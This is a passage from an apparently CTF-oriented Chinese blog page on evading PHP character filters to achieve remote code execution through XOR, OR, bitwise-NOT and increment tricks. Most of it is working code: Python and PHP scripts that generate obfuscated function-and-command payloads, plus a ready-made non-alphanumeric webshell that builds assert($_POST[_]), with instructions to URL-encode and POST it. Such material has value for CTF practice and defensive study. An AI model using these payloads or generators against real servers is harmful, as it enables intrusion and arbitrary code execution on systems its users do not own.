class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   <span class="built_in">print</span>(param)</span><br></pre></td></tr></table></figure><h3 id="列举所有字符（即使不可见）"><a href="#列举所有字符（即使不可见）" class="headerlink" title="列举所有字符（即使不可见）"></a>列举所有字符（即使不可见）</h3><p>在异或中，即使是不可见的字符也可以用来构造payload，不过可能会出问题，只有在常规异或不行时才使用<br>这个脚本允许你指定一个字符，然后生成所有可能的异或结果（包括不可见字符）到一个文件，我们只需要选取没有被过滤的字符就可以了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">filename = <span class="string">&quot;xor.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r_xor</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">127</span>):</span><br><span class="line">            result=i^j</span><br><span class="line">            rr=<span class="string">&quot;  &quot;</span>+<span class="built_in">chr</span>(i)+<span class="string">&quot; ASCII:&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27; &lt;--xor--&gt; &#x27;</span>+<span class="built_in">chr</span>(j)+<span class="string">&quot; ASCII:&quot;</span>+<span class="built_in">str</span>(j)+<span class="string">&#x27; == &#x27;</span>+<span class="built_in">chr</span>(result)+<span class="string">&quot; ASCII:&quot;</span>+<span class="built_in">str</span>(result)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;a&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">                file.write(rr+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    r_xor()</span><br></pre></td></tr></table></figure><p>不可见（不可打印）字符可以使用url编码来构造payload，url编码单个字符的格式是：百分号加上对应字符的十六进制数值</p><h1 id="或绕过（大致同上）"><a href="#或绕过（大致同上）" class="headerlink" title="或绕过（大致同上）"></a>或绕过（大致同上）</h1><p>先使用这个php脚本生成文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* author yu22x */</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;or_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&#x27;/[0-9a-z]/i&#x27;</span>;<span class="comment">//根据题目给的正则表达式修改即可</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line"><span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)|<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure><p>然后使用这个python脚本构造命令：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># author yu22x</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;or_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   <span class="built_in">print</span>(param)</span><br></pre></td></tr></table></figure><h1 id="取反绕过"><a href="#取反绕过" class="headerlink" title="取反绕过"></a>取反绕过</h1><h2 id="普通取反-无版本限制"><a href="#普通取反-无版本限制" class="headerlink" title="普通取反 无版本限制"></a>普通取反 无版本限制</h2><p>取反基本用的都是不可见字符，以下给出脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//在命令行中运行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$system</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$command</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$system</span>).<span class="string">&#x27;)(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$command</span>).<span class="string">&#x27;);&#x27;</span>;</span><br></pre></td></tr></table></figure><h2 id="汉字取反-不清楚版本"><a href="#汉字取反-不清楚版本" class="headerlink" title="汉字取反 不清楚版本"></a>汉字取反 不清楚版本</h2><p>给出脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">str_split_unicode</span>(<span class="params"><span class="variable">$str</span>, <span class="variable">$l</span> = <span class="number">0</span></span>) </span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$l</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$len</span> = <span class="title function_ invoke__">mb_strlen</span>(<span class="variable">$str</span>, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span> += <span class="variable">$l</span>) &#123;</span><br><span class="line">            <span class="variable">$ret</span>[] = <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$str</span>, <span class="variable">$i</span>, <span class="variable">$l</span>, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_split</span>(<span class="string">&quot;//u&quot;</span>, <span class="variable">$str</span>, -<span class="number">1</span>, PREG_SPLIT_NO_EMPTY);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$s</span> = <span class="string">&#x27;此处填入你需要的中文字符，比如一段话&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$arr_str</span>=<span class="title function_ invoke__">str_split_unicode</span>(<span class="variable">$s</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>) ; <span class="variable">$i</span>++) &#123; </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$arr_str</span>[<span class="variable">$i</span>].<span class="string">&#x27;--&gt;&#x27;</span>.~<span class="variable">$arr_str</span>[<span class="variable">$i</span>]&#123;<span class="number">1</span>&#125;.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="URL编码取反-PHP7"><a href="#URL编码取反-PHP7" class="headerlink" title="URL编码取反 PHP7"></a>URL编码取反 PHP7</h2><p>执行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;phpinfo&#x27;</span>)</span><br><span class="line"><span class="comment">//输出：%8F%97%8F%96%91%99%90</span></span><br></pre></td></tr></table></figure><p>输出phpinfo的取反结果（这里假设没有过滤括号），我们构造payload时要将url编码括起来，再在前面加入~来取反,比如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F%<span class="number">96</span>%<span class="number">91</span>%<span class="number">99</span>%<span class="number">90</span>)</span><br></pre></td></tr></table></figure><h1 id="自增绕过-未知"><a href="#自增绕过-未知" class="headerlink" title="自增绕过 未知"></a>自增绕过 未知</h1><p>在PHP中‘a’++ &#x3D;&gt; ‘b’，‘b’++ &#x3D;&gt; ‘c’… 所以，我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符。<br>那么，如何拿到一个值为字符串’a’的变量呢？<br>巧了，数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。<br>在PHP中，如果强制连接 数组 和 字符串 的话，数组将被转换成字符串，其值为Array<br>再取这个字符串的第一个字母，就可以获得’A’了。<br>利用这个技巧，编写了如下webshell（因为PHP函数是大小写不敏感的，所以我们最终执行的是ASSERT($POST[ _ ])，无需获取小写a）<br>注意最后传入的时候记得URL编码一次</p><p>这里给出一些示例payload，建议使用eval()，不过要自己构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="variable">$_</span>=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>; <span class="comment">// $_=&#x27;Array&#x27;;</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>]; <span class="comment">// $_=$_[0];</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>; <span class="comment">// A</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// E </span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// R</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// P</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// O</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$____</span>;</span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]); <span class="comment">// ASSERT($_POST[_]);</span></span><br></pre></td></tr></table></figure><p>构造好的payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//测试发现7.0.12以上版本不可使用</span></span><br><span class="line"><span class="comment">//使用时需要url编码下</span></span><br><span class="line"><span class="variable">$_</span>=[];<span class="variable">$_</span>=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>;<span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>];<span class="variable">$___</span>=<span class="variable">$_</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$_</span>=<span class="variable">$$____</span>;<span class="variable">$___</span>(<span class="variable">$_</span>[_]);</span><br><span class="line">固定格式 构造出来的 <span class="title function_ invoke__">assert</span>(<span class="variable">$_POST</span>[_]);</span><br><span class="line">然后post传入   